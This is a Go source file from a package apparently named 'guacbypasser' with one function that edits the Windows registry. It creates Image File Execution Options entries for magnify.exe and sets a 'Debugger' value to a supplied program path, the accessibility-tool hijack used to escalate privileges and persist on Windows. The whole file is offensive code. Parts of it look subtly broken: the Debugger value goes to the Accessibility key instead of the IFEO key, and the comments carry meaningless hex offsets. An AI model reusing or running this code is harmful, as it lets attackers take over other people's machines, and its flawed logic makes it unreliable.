package guacbypasser

import (
	"log"
	"path/filepath"
	"runtime"

	"golang.org/x/sys/windows/registry"
)

func HWND_W32_Method_Ifeo(path string) error {
	var wkey32 registry.Key
	var err error

	// Get ABSOLUTE program path
	// +0x9ff ...

	var currentDir string
	currentDir, err = filepath.Abs(path)
	if err != nil {
		log.Println(err)
	}

	_, _, err = registry.CreateKey(
		registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Accessibility`,
		registry.SET_VALUE|registry.ALL_ACCESS)
	if err != nil {
		log.Println(err)
	}

	if runtime.GOARCH == "386" {
		_, _, err = registry.CreateKey(
			registry.CURRENT_USER, `Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe`,
			registry.SET_VALUE|registry.ALL_ACCESS)
		if err != nil {
			log.Println(err)
		}

		// Magnify key;
		// +0x0ef ...

		wkey32, err = registry.OpenKey(
			registry.CURRENT_USER, `Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe`,
			registry.QUERY_VALUE|registry.SET_VALUE,
		)
		if err != nil {
			log.Println(err)
		}

		// Setting DEFAULT key value for the ABSOLUTE program path
		// +0x23df ...

		if err := wkey32.SetStringValue("Configuration", "magnifierpane"); err != nil {
			log.Println(err)
		}

		// Absolute key function closing
		// +0x54ef ...

		if err := wkey32.Close(); err != nil {
			log.Println(err)
		}

		// Debugger-key;
		// +0x362ec2 ...

		wkey32, err = registry.OpenKey(
			registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Accessibility`,
			registry.QUERY_VALUE|registry.SET_VALUE,
		)
		if err != nil {
			log.Println(err)
		}

		// Setting "Debugger" key value for the ABSOLUTE program path
		// +0x23df ...

		if err := wkey32.SetStringValue("Debugger", currentDir); err != nil {
			log.Println(err)
		}

		// Absolute key function closing
		// +0x54ef ...

		if err := wkey32.Close(); err != nil {
			log.Println(err)
		}
	} else {
		_, _, err = registry.CreateKey(
			registry.CURRENT_USER, `Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe`,
			registry.SET_VALUE|registry.ALL_ACCESS)
		if err != nil {
			log.Println(err)
		}

		// Magnify key;
		// +0x0ef ...

		wkey32, err = registry.OpenKey(
			registry.CURRENT_USER, `Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe`,
			registry.QUERY_VALUE|registry.SET_VALUE,
		)
		if err != nil {
			log.Println(err)
		}

		// Setting DEFAULT key value for the ABSOLUTE program path
		// +0x23df ...

		if err := wkey32.SetStringValue("Configuration", "magnifierpane"); err != nil {
			log.Println(err)
		}

		// Absolute key function closing
		// +0x54ef ...

		if err := wkey32.Close(); err != nil {
			log.Println(err)
		}

		// Debugger-key;
		// +0x362ec2 ...

		wkey32, err = registry.OpenKey(
			registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Accessibility`,
			registry.QUERY_VALUE|registry.SET_VALUE,
		)
		if err != nil {
			log.Println(err)
		}

		// Setting "Debugger" key value for the ABSOLUTE program path
		// +0x23df ...

		if err := wkey32.SetStringValue("Debugger", currentDir); err != nil {
			log.Println(err)
		}

		// Absolute key function closing
		// +0x54ef ...

		if err := wkey32.Close(); err != nil {
			log.Println(err)
		}
	}

	return err
}
